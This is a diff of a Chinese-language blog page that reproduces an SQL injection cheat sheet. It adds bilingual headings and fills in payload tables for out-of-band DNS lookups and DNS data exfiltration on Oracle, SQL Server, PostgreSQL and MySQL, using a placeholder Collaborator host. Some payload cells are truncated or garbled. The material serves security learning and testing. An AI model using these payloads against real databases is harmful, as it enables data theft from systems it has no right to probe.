@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Black House">
 <meta property="og:description" content="This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks. String concatenation 字符串连接You c">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-05T07:37:23.614Z">
+<meta property="og:updated_time" content="2019-08-13T10:32:27.369Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL injection cheat sheet">
 <meta name="twitter:description" content="This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks. String concatenation 字符串连接You c">
@@ -421,7 +421,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h1 id="Database-contents"><a href="#Database-contents" class="headerlink" title="Database contents"></a>Database contents</h1><p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
+<h1 id="Database-contents-数据库内容"><a href="#Database-contents-数据库内容" class="headerlink" title="Database contents 数据库内容"></a>Database contents 数据库内容</h1><p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
 <table>
 <thead>
 <tr>
@@ -447,7 +447,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h1 id="Conditional-errors"><a href="#Conditional-errors" class="headerlink" title="Conditional errors"></a>Conditional errors</h1><p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
+<h1 id="Conditional-errors-条件错误"><a href="#Conditional-errors-条件错误" class="headerlink" title="Conditional errors 条件错误"></a>Conditional errors 条件错误</h1><p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
 <table>
 <thead>
 <tr>
@@ -473,7 +473,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h1 id="Batched-or-stacked-queries"><a href="#Batched-or-stacked-queries" class="headerlink" title="Batched (or stacked) queries"></a>Batched (or stacked) queries</h1><p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
+<h1 id="Batched-or-stacked-queries-批量查询"><a href="#Batched-or-stacked-queries-批量查询" class="headerlink" title="Batched (or stacked) queries 批量查询"></a>Batched (or stacked) queries 批量查询</h1><p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
 <table>
 <thead>
 <tr>
@@ -499,7 +499,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h1 id="Time-delays"><a href="#Time-delays" class="headerlink" title="Time delays"></a>Time delays</h1><p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
+<h1 id="Time-delays-时间延迟"><a href="#Time-delays-时间延迟" class="headerlink" title="Time delays 时间延迟"></a>Time delays 时间延迟</h1><p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
 <table>
 <thead>
 <tr>
@@ -525,7 +525,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h1 id="Conditional-time-delays"><a href="#Conditional-time-delays" class="headerlink" title="Conditional time delays"></a>Conditional time delays</h1><p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
+<h1 id="Conditional-time-delays-有条件的时间延迟"><a href="#Conditional-time-delays-有条件的时间延迟" class="headerlink" title="Conditional time delays 有条件的时间延迟"></a>Conditional time delays 有条件的时间延迟</h1><p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
 <table>
 <thead>
 <tr>
@@ -551,7 +551,7 @@
 </tr>
 </tbody></table>
 <hr>
-<h1 id="DNS-lookup"><a href="#DNS-lookup" class="headerlink" title="DNS lookup"></a>DNS lookup</h1><p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
+<h1 id="DNS-lookup-DNS查询"><a href="#DNS-lookup-DNS查询" class="headerlink" title="DNS lookup DNS查询"></a>DNS lookup DNS查询</h1><p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
 <table>
 <thead>
 <tr>
@@ -561,26 +561,23 @@
 </thead>
 <tbody><tr>
 <td align="left">Oracle</td>
-<td align="left">``</td>
+<td align="left">The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<code>SELECT UTL_INADDR.get_host_address(&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;)</code></td>
 </tr>
 <tr>
 <td align="left">Microsoft</td>
-<td align="left">``</td>
+<td align="left"><code>exec master..xp_dirtree &#39;//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#39;</code></td>
 </tr>
 <tr>
 <td align="left">PostgreSQL</td>
-<td align="left">``</td>
+<td align="left"><code>copy (SELECT &#39;&#39;) to program &#39;nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;</code></td>
 </tr>
 <tr>
 <td align="left">MySQL</td>
-<td align="left">``</td>
+<td align="left">The following techniques work on Windows only:<br><code>LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)</code><br><code>SELECT ... INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
 </tr>
 </tbody></table>
-<p>Oracle    The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br><code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code></p>
-<p>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br>SELECT UTL_INADDR.get_host_address(‘YOUR-SUBDOMAIN-HERE.burpcollaborator.net’)</p>
-<p>Microsoft    exec master..xp_dirtree ‘//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a’<br>PostgreSQL    copy (SELECT ‘’) to program ‘nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net’<br>MySQL    The following techniques work on Windows only:<br>LOAD_FILE(‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’)<br>SELECT … INTO OUTFILE ‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’</p>
 <hr>
-<h1 id="DNS-lookup-with-data-exfiltration"><a href="#DNS-lookup-with-data-exfiltration" class="headerlink" title="DNS lookup with data exfiltration"></a>DNS lookup with data exfiltration</h1><p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
+<h1 id="DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找"><a href="#DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找" class="headerlink" title="DNS lookup with data exfiltration 使用数据泄露进行DNS查找"></a>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</h1><p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
 <table>
 <thead>
 <tr>
@@ -590,25 +587,39 @@
 </thead>
 <tbody><tr>
 <td align="left">Oracle</td>
-<td align="left">``</td>
+<td align="left">`SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?>&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM “http://‘</td>
 </tr>
 <tr>
 <td align="left">Microsoft</td>
-<td align="left">``</td>
+<td align="left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&#39;)</code></td>
 </tr>
 <tr>
 <td align="left">PostgreSQL</td>
-<td align="left">``</td>
+<td align="left">create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := ‘copy (SELECT ‘’’’) to program ‘’nslookup ‘</td>
 </tr>
 <tr>
 <td align="left">MySQL</td>
-<td align="left">``</td>
+<td align="left">The following technique works on Windows only:<code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
 </tr>
 </tbody></table>
-<p>Oracle    SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]&gt;’),’/l’) FROM dual<br>Microsoft    declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(‘master..xp_dirtree “//‘+@p+’.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a”‘)<br>PostgreSQL    create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := ‘copy (SELECT ‘’’’) to program ‘’nslookup ‘||p||’.YOUR-SUBDOMAIN-HERE.burpcollaborator.net’’’;<br>execute c;<br>END;<br>$$ language plpgsql security definer;<br>SELECT f();<br>MySQL    The following technique works on Windows only:<br>SELECT YOUR-QUERY-HERE INTO OUTFILE ‘\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a’</p>
 <hr>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><hr>
-<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>SQL注入在不同数据库的表现,可表现在这些方面:</p>
+<ul>
+<li>String concatenation 字符串连接</li>
+<li>Comments 注释</li>
+<li>Database version 数据库版本的查询</li>
+<li>Database contents 数据库内容的查询</li>
+<li>Conditional errors 条件错误</li>
+<li>Batched (or stacked) queries 批量查询</li>
+<li>Time delays 时间延迟</li>
+<li>Conditional time delays 有条件的时间延迟</li>
+<li>DNS lookup DNS查询<br>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</li>
+</ul>
+<hr>
+<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
+<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">SQL injection cheat sheet</a></li>
+</ul>
+
       
     </div>
     
@@ -638,8 +649,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/05/01/SQLi-注入的分类/" rel="next" title="SQLi-注入的分类">
-                <i class="fa fa-chevron-left"></i> SQLi-注入的分类
+              <a href="/2019/04/25/WPSIH-网站个人敏感信息文件扫描器-开发记录/" rel="next" title="WPSIH-网站个人敏感信息文件扫描器-开发记录">
+                <i class="fa fa-chevron-left"></i> WPSIH-网站个人敏感信息文件扫描器-开发记录
               </a>
             
           </div>
@@ -648,8 +659,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/05/10/python-杀死subprocess进程/" rel="prev" title="python-杀死subprocess进程">
-                python-杀死subprocess进程 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/05/01/SQLi-注入的分类/" rel="prev" title="SQLi-注入的分类">
+                SQLi-注入的分类 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -729,7 +740,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -784,7 +795,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#String-concatenation-字符串连接"><span class="nav-number">1.</span> <span class="nav-text">String concatenation 字符串连接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Comments-注释"><span class="nav-number">2.</span> <span class="nav-text">Comments 注释</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Database-version-数据库版本"><span class="nav-number">3.</span> <span class="nav-text">Database version 数据库版本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Database-contents"><span class="nav-number">4.</span> <span class="nav-text">Database contents</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conditional-errors"><span class="nav-number">5.</span> <span class="nav-text">Conditional errors</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Batched-or-stacked-queries"><span class="nav-number">6.</span> <span class="nav-text">Batched (or stacked) queries</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Time-delays"><span class="nav-number">7.</span> <span class="nav-text">Time delays</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conditional-time-delays"><span class="nav-number">8.</span> <span class="nav-text">Conditional time delays</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS-lookup"><span class="nav-number">9.</span> <span class="nav-text">DNS lookup</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS-lookup-with-data-exfiltration"><span class="nav-number">10.</span> <span class="nav-text">DNS lookup with data exfiltration</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">11.</span> <span class="nav-text">总结:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refs"><span class="nav-number">12.</span> <span class="nav-text">Refs:</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#String-concatenation-字符串连接"><span class="nav-number">1.</span> <span class="nav-text">String concatenation 字符串连接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Comments-注释"><span class="nav-number">2.</span> <span class="nav-text">Comments 注释</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Database-version-数据库版本"><span class="nav-number">3.</span> <span class="nav-text">Database version 数据库版本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Database-contents-数据库内容"><span class="nav-number">4.</span> <span class="nav-text">Database contents 数据库内容</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conditional-errors-条件错误"><span class="nav-number">5.</span> <span class="nav-text">Conditional errors 条件错误</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Batched-or-stacked-queries-批量查询"><span class="nav-number">6.</span> <span class="nav-text">Batched (or stacked) queries 批量查询</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Time-delays-时间延迟"><span class="nav-number">7.</span> <span class="nav-text">Time delays 时间延迟</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conditional-time-delays-有条件的时间延迟"><span class="nav-number">8.</span> <span class="nav-text">Conditional time delays 有条件的时间延迟</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS-lookup-DNS查询"><span class="nav-number">9.</span> <span class="nav-text">DNS lookup DNS查询</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找"><span class="nav-number">10.</span> <span class="nav-text">DNS lookup with data exfiltration 使用数据泄露进行DNS查找</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">11.</span> <span class="nav-text">总结:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Refs"><span class="nav-number">12.</span> <span class="nav-text">Refs:</span></a></li></ol></div>
             
 
           </div>
